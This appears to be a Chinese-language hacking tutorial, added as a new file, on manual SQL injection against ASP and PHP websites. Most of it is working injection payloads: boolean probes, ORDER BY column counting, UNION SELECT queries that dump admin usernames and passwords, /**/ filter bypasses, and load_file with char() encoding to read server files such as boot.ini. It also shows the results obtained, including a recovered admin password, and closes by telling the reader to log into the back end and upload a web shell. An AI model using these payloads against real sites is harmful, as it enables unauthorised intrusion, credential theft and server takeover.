@@ -1,0 +1,77 @@
+ASP手工注入
+
+检验：'  返回错误         and 1=1返回正常     and 1=2 返回错误   
+
+或者：
+
+xor 1=1 返回错误    xor 1=2 返回正常
+
+注入：
+
+and exists (select * from admin)  判断是否存在admin表段
+
+order by 10  这里的10是参数用来猜有多少个字段数
+
+11错误  10 返回正常页面
+
+and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin   让页面出错然后联合查询
+
+假设页面中出现一个“2”和一个“5”那么
+
+and 1=2 union select 1,username,3,4,password,6,7,8,9,10 from admin  这句话爆出账号密码
+
+其中“username”和“password”是两个字段，我们也可以替换，总之这里就需要我们去猜了。
+
+⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙by:云絮⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙
+PHP：
+
+架设目标网站：http://www.xxx.org.cn:81
+
+注入点: http://www.xxx.org.cn:81/news.php?id=780
+1.认识注入类型
+不管是asp.aspx.php,注入的标准类型必为
+http://www.xxxx.com/aa.asp?p=xxx
+http://www.xxxx.com/aa.aspx?p=xxx
+http://www.xxxx.com/aa.php?p=xxx
+2.判断是否存在注入
+不管是asp.aspx.php,注入点的判断都是这样的
+http://xxx.xxx.xxx.xxx/down/show.php?id=26 and 1=1返回正常页
+http://xxx.xxx.xxx.xxx/down/show.php?id=26 and 1=2,返回错误页
+存在注入
+3.猜解准确字段数
+(不明白原理的请多看看这方面的文章,这只讲实际运用)
+利用union来查询准确字段，如: and 1=2 union select 1,2,3,.......直到返回正常，说明猜到准确字段数。如过滤了空格可以用 /**/代替。
+http://www.xxx.org.cn:81/news.php?id=780 and 1=2 union select 1,2,3,4,5,6,7
+http://www.xxx.org.cn:81/news.php?id=780/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7
+记下这个位置，3 和5
+4.mysql也有内置变量，可以帮助我们获得更多信息
+version()(4.0.21-nt)返回当前数据库版本信息，database(){db_xxx_org_cn} 返回当前数据库名,user(),{tt1330@localhost}返回MYSQL用户名，可以帮助我们获得更多信息。这些都是很基础的东西
+现在就在3和5这插入
+http://www.xxx.org.cn:81/news.php?id=780%20and%201=2%20union%20select%201,2,version(),4,5,6,7
+Load_file可以返回文件的内容
+(1)，读取系统信息
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Windows Server 2003, Enterprise" /fastdetect /NoExecute=OptOut multi(0)disk(0)rdisk(1)partition(1)\WINDOWS="Boot Mirror C: - secondary plex" multi(0)disk(0)rdisk(1)partition(1)\WINDOWS="Boot Mirror C: - secondary plex"
+(2)读取php配置信息
+我们转化一下，
+load_file('c:\boot.ini')=load_file(char(99,58,92,98,111,111,116,46,105,110,105))
+5.准确猜解表
+如: and 1=1 union select 1,2,3,4,5,6.... from user 如果返回正常说明存在这个表。
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,3,4,5,6,7 from admin
+说明没有admin表
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,3,4,5,6,7 from user
+正常说明有这个表
+6.猜解表中的字段
+and 1=1 union select 1,username,3,4,5,6.... from user/*如果字段显示出字段内容则存在些字段。
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,user,4,5,6,7 from user
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,name,4,5,6,7 from user
+有字段name
+同理再猜解password字段,猜解成功再找后台登录。
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,pass,4,5,6,7 from user
+http://www.xxx.org.cn:81/news.php?id=780 and 1=1 union select 1,2,pwd,4,5,6,7 from user
+有字段pwd
+7.暴管理员的用户名，密码是多少
+http://www.xxx.org.cn:81/news.php?id=780 and 1=2 union select 1,2,3,4,5,6,7 from user
+http://www.xxx.org.cn:81/news.php?id=780 and 1=2 union select 1,2,pwd,4,name,6,7 from user
+name:admin
+pwd:83863176
+7.登录后台，上传shell。 
